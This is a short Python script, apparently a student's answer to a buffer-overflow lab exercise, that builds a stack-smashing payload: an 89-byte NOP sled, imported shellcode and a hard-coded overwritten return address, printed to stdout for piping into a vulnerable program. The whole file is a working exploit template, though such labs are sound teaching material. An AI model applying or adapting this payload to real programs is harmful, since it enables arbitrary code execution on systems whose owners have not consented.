#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
# use a nop-sled; calculated 89 to be sufficient to overwrite return address.
# calculated 0xffffd6eb to be first instruction of shellcode payload
padding = (b'\x90')
new_addr = pack("<I", 0xffffd6f1)
payload  = padding * 89 + shellcode + new_addr
sys.stdout.buffer.write(payload)
